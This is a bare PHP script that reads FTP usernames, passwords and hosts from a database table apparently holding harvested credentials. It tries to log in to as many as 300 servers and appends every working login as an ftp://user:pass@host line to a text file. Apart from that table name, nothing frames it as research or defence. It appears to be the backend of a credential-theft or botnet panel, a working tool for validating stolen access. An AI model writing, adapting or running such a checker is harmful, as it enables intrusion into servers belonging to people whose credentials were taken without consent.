<?php

set_time_limit(0);
ini_set('max_execution_time', 0);

$ftps = $mysqli->query('SELECT v1, v2, v3, concat(\'ftp://\', v1, \':\', v2, \'@\', v3, \'/\') ftp_line FROM bf_filter_ftps_panels ORDER by rand() DESC');
$i = 0;
$domain = ' ';
foreach($ftps as $ftp){	if($i <= 300){
		if(strpos($domain, $ftp->v2 . '|') == false){			$open = ftp_connect($ftp->v3, '21','10');

			if(ftp_login($open,$ftp->v1,$ftp->v2)){				$domain .= $ftp->v2 . '|';
				file_put_contents('panels_ftps.txt', $ftp->ftp_line . "\r\n", FILE_APPEND);
				$i++;
			}

			ftp_close($open);
		}
	}else{		break;
	}
}

?>